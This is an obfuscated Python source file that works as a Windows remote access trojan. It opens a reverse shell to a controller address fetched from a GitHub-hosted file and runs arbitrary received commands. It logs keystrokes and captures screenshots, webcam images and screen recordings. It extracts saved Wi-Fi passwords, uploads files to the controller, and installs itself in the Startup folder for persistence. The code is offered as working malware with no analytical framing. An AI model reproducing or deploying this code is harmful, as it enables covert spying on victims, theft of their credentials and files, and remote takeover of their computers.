import urllib.request,subprocess,socket,time,os,json,base64,shutil,re
from datetime import datetime
BlNaRUkNWXaZN = ""
PHhsFYmeqFmkaiaxe = ""
KjiBNJydWMdCBkrFETI = "26.11.25.1"
TSyzMiQgSbQzasr = True
voSJxZxqHfVjg = "!"
AQuQwVmZeTzKZjHhZAzkS = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
sbOonhH = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
YrddOvQSoVFvKPk = os.path.expanduser("~\\AppData\\Local\\")
yamZwumgCORaximYd = os.path.expanduser("~\\AppData\\Roaming\\")
kwJMdVQscwQHbq = ""
def fSzcYvKRRuqXiuxhDRWhbAW(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def SrJqTSWCU(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	qMdgInPRucZgIB = data.decode("utf-8").replace("\n","")
	if not qMdgInPRucZgIB.startswith(voSJxZxqHfVjg):
		proc = subprocess.run(qMdgInPRucZgIB, shell=True, capture_output=True)
		wnCCNziwxXvAMyrTjT = proc.stdout + proc.stderr
		pCYrOYcZcbAVxiRLznQfXRJ(s, wnCCNziwxXvAMyrTjT)
		return
	qnWPAJSEbjZIwt = qMdgInPRucZgIB.split(" ")[0][1:]
	args = " ".join(qMdgInPRucZgIB.split()[1:]).split()
	if qnWPAJSEbjZIwt == "cd":
		moveDirectory(s, qMdgInPRucZgIB[4:])
	elif qnWPAJSEbjZIwt == "screenshot":
		FEXfbGr(s)
	elif qnWPAJSEbjZIwt == "webcam":
		GzSvJiXZQGUdZacR(s, args)
	elif qnWPAJSEbjZIwt == "download":
		qjkGYfwy(s, qMdgInPRucZgIB)
	elif qnWPAJSEbjZIwt == "upload":
		VLwhNpEtVhISWkgxZPUG(s, qMdgInPRucZgIB)
	elif qnWPAJSEbjZIwt == "wifi":
		bFdILPhoEeSGMord(s)
	elif qnWPAJSEbjZIwt == "screenrecord":
		KmEcyeEyNujiSJLWdCa(s, args)
	elif qnWPAJSEbjZIwt == "update":
		LBALFsCp(s)
	elif qnWPAJSEbjZIwt == "basename":
		pCYrOYcZcbAVxiRLznQfXRJ(s, os.path.basename(__file__))
	else:
		pCYrOYcZcbAVxiRLznQfXRJ(s,"")
def moveDirectory(s, path):
	try:
		os.chdir(path)
		pCYrOYcZcbAVxiRLznQfXRJ(s,"")
	except:
		pCYrOYcZcbAVxiRLznQfXRJ(s, "[!] 404")
def qjkGYfwy(s, qMdgInPRucZgIB):
	UTUbkPHJeKYOmngTs = qMdgInPRucZgIB.replace(voSJxZxqHfVjg+"download ","").split(",")
	wnCCNziwxXvAMyrTjTs = ""
	for f in UTUbkPHJeKYOmngTs:
		wnCCNziwxXvAMyrTjTs += RMlHaHAGfLwXTHZe(f, "api/file/", { "type":os.path.splitext(f)[1] })
	pCYrOYcZcbAVxiRLznQfXRJ(s, wnCCNziwxXvAMyrTjTs)
def FEXfbGr(s):
	from PIL import ImageGrab
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	RlimXQyKMLhoLgaSyIjU = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(RlimXQyKMLhoLgaSyIjU)
	image.close()
	wnCCNziwxXvAMyrTjT = RMlHaHAGfLwXTHZe(RlimXQyKMLhoLgaSyIjU, "api/sscap")
	os.remove(RlimXQyKMLhoLgaSyIjU)
	pCYrOYcZcbAVxiRLznQfXRJ(s, wnCCNziwxXvAMyrTjT)
def GzSvJiXZQGUdZacR(s, args):
	import cv2
	cameraNumber = 0
	fname = "wc.jpg"
	try:
		if len(args) > 0:
			try: cameraNumber = int(args[0])
			except: pass
		cam = cv2.VideoCapture(cameraNumber)
		_, frame = cam.read()
		cv2.imwrite(YrddOvQSoVFvKPk+fname, frame)
		cam.release()
		r=RMlHaHAGfLwXTHZe(YrddOvQSoVFvKPk+fname,"api/wc")
		os.remove(YrddOvQSoVFvKPk+fname)
		pCYrOYcZcbAVxiRLznQfXRJ(s, r)
	except Exception as e:
		pCYrOYcZcbAVxiRLznQfXRJ(s, "[!] 404: "+str(e))
def KmEcyeEyNujiSJLWdCa(s, args):
	import imageio
	from PIL import ImageGrab
	qORzXoUjh = 15
	if not args == []:
		try: qORzXoUjh = int(args[0])
		except: pass
	GnlsxgkakaVLzyaLmUkJf = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	IKwUvtglSzxrWHCtYYE = []
	fps = 11
	numFrames = qORzXoUjh * fps
	for _ in range(numFrames):
		IKwUvtglSzxrWHCtYYE.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(GnlsxgkakaVLzyaLmUkJf, IKwUvtglSzxrWHCtYYE, fps=fps, quality=8)
	r=RMlHaHAGfLwXTHZe(GnlsxgkakaVLzyaLmUkJf, "api/screc")
	os.remove(GnlsxgkakaVLzyaLmUkJf)
	pCYrOYcZcbAVxiRLznQfXRJ(s, r)
def RMlHaHAGfLwXTHZe(joFWwUM, BOMcghrHRbtblo, UJfCmzLtSSKcekxh=None):
	import requests
	if not os.path.isfile(joFWwUM):
		return "[!] 404: "+joFWwUM+"\n"
	headers = {"user":os.getlogin()}
	if UJfCmzLtSSKcekxh is not None:
		headers = {**headers, **UJfCmzLtSSKcekxh}
	f = open(joFWwUM, "rb")
	requests.post("http://"+BlNaRUkNWXaZN+":5555/"+BOMcghrHRbtblo,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200"
def VLwhNpEtVhISWkgxZPUG(s, qMdgInPRucZgIB):
	import requests
	wchdCZfUtIl = qMdgInPRucZgIB.split(" ")[-1]
	PldNXsPgKXj = qMdgInPRucZgIB.replace(voSJxZxqHfVjg+"upload ","").replace(" "+wchdCZfUtIl,"")
	if os.path.exists(PldNXsPgKXj) or os.path.isfile(PldNXsPgKXj):
		pCYrOYcZcbAVxiRLznQfXRJ(s, "[!] 409")
		return
	
	response = requests.get(f"http://{BlNaRUkNWXaZN}:5555/api/content/{wchdCZfUtIl}", headers={"auth":"981xyz"})
	if response.status_code != 200:
		pCYrOYcZcbAVxiRLznQfXRJ(s, "[!] 404")
		return
	
	with open(PldNXsPgKXj, "wb") as f:
		f.write(response.content)
	
	pCYrOYcZcbAVxiRLznQfXRJ(s, "[+] 200")
def BUZsbDWwNsstcwkvM(UWRQxjZigoWLRYvQKrJY, BOMcghrHRbtblo):
	import requests
	if UWRQxjZigoWLRYvQKrJY.strip() == "":
		return "[!] 204"
	requests.post("http://"+BlNaRUkNWXaZN+":5555/"+BOMcghrHRbtblo,
		data=UWRQxjZigoWLRYvQKrJY,
		headers={"user":os.getlogin()})
	return "[+] 200"
def LBALFsCp(s):
	h, p, v = aNAhQCSjYkFikdL(True)
	if (v != KjiBNJydWMdCBkrFETI):
		HfSTzaNdwP(v)
		pCYrOYcZcbAVxiRLznQfXRJ(s, "[+] 200")
	else:
		pCYrOYcZcbAVxiRLznQfXRJ(s, "[-] 304")
def bFdILPhoEeSGMord(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		pCYrOYcZcbAVxiRLznQfXRJ(s, "[!] 500")
		return
	JrxgVtELRuw = ""
	for p in profiles:
		try: JrxgVtELRuw+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()
		except: JrxgVtELRuw+=f"    {p} - N/A"
	pCYrOYcZcbAVxiRLznQfXRJ(s, JrxgVtELRuw)
def HfSTzaNdwP(IBpxGtKmweLqARFdaIqqR):
	import requests
	global TSyzMiQgSbQzasr
	CDYBfCqijpLReuzArfQsak = os.path.basename(__file__)
	fileType = CDYBfCqijpLReuzArfQsak.split(".")[-1]
	sZkgbhnjthi = CDYBfCqijpLReuzArfQsak.split(".")[0]+"."+IBpxGtKmweLqARFdaIqqR+".pyw" if fileType.startswith("py") else ".exe"
	qnmBidKWyyDTqztuOhB = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), sZkgbhnjthi)
	if not os.path.isfile(qnmBidKWyyDTqztuOhB):
		with open(qnmBidKWyyDTqztuOhB, "w+") as f:
			f.write(requests.get(sbOonhH+"file."+ "pyw" if qnmBidKWyyDTqztuOhB.split(".")[-1].startswith("py") else "exe").text)
	else:
		TSyzMiQgSbQzasr = False
def aNAhQCSjYkFikdL(force=False):
	global BlNaRUkNWXaZN, PHhsFYmeqFmkaiaxe
	if force or BlNaRUkNWXaZN == "" or PHhsFYmeqFmkaiaxe == "":
		while True:
			try:
				with urllib.request.urlopen(AQuQwVmZeTzKZjHhZAzkS) as response:
					data = response.read().decode("utf-8").replace("\n","").split(":")
					BlNaRUkNWXaZN = data[0].strip()
					PHhsFYmeqFmkaiaxe = data[1].strip()
					IBpxGtKmweLqARFdaIqqR = data[2].strip()
					return BlNaRUkNWXaZN, PHhsFYmeqFmkaiaxe, IBpxGtKmweLqARFdaIqqR
			except:
				time.sleep(10)
def mpHGSPrZkMTrNu():
	try:
		cxQKmCtjwQ = "settings.xpb"
		KYXpimhcpWwuZ = sorted([file for file in os.listdir(YrddOvQSoVFvKPk) if os.path.isfile(YrddOvQSoVFvKPk+"\\"+file) and file.endswith(cxQKmCtjwQ.split(".")[-1])])
		if cxQKmCtjwQ in KYXpimhcpWwuZ:
			KYXpimhcpWwuZ.remove(cxQKmCtjwQ)
		YJfJmoIXIv = os.path.join(YrddOvQSoVFvKPk,cxQKmCtjwQ)
		if len(KYXpimhcpWwuZ) > 0:
			with open(YJfJmoIXIv, "ab+") as f:
				for file in KYXpimhcpWwuZ:
					temp = os.path.join(YrddOvQSoVFvKPk,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		RMlHaHAGfLwXTHZe(YJfJmoIXIv, "api/log")
		if os.path.isfile(YJfJmoIXIv):
			os.remove(YJfJmoIXIv)
	except:
		pass
def XynAZHGAGMr():
	from pynput.keyboard import Listener
	import logging
	logging.basicConfig(filename=(YrddOvQSoVFvKPk+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def jxztmJxMoPLqcEIi(k):
		logging.info(str(k))
	k=Listener(on_press=jxztmJxMoPLqcEIi)
	JTdIBNJWGtOLdQbiCZyVo = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in JTdIBNJWGtOLdQbiCZyVo:
		l.setLevel(logging.CRITICAL)
	k.start()
def pCYrOYcZcbAVxiRLznQfXRJ(clientSocket, UWRQxjZigoWLRYvQKrJY):
	formattedData = b""
	if type(UWRQxjZigoWLRYvQKrJY) == bytes:
		formattedData += UWRQxjZigoWLRYvQKrJY
	else:
		formattedData += bytes(UWRQxjZigoWLRYvQKrJY, "utf-8")
	formattedData += bytes("\n"+kwJMdVQscwQHbq+os.getcwd().replace("\\","/")+" >> ", "utf-8")
	clientSocket.sendall(formattedData)
def cAwnLOUp():
	global kwJMdVQscwQHbq
	h, p, v = aNAhQCSjYkFikdL()
	try: mpHGSPrZkMTrNu()
	except: pass
	try:
		if KjiBNJydWMdCBkrFETI != v:
			HfSTzaNdwP(v)
	except: pass
	try:
		if TSyzMiQgSbQzasr:
			XynAZHGAGMr()
		pass
	except:
		pass
	try: os.chdir(os.path.expanduser("~"))
	except: pass
	kwJMdVQscwQHbq = ("(old)"if KjiBNJydWMdCBkrFETI!=v else "")+"["+KjiBNJydWMdCBkrFETI+"] "+os.getlogin()+" - "
	while True:
		WQqwbToggHNcVhBXkTpMqCT=False
		try:
			s=fSzcYvKRRuqXiuxhDRWhbAW(h, p)
			pCYrOYcZcbAVxiRLznQfXRJ(s, "")
			while not WQqwbToggHNcVhBXkTpMqCT:
				try: WQqwbToggHNcVhBXkTpMqCT=SrJqTSWCU(s)
				except Exception as e:
					pCYrOYcZcbAVxiRLznQfXRJ(s, str(e))
			s.close()
		except:
			pass
		time.sleep(5)
cAwnLOUp()
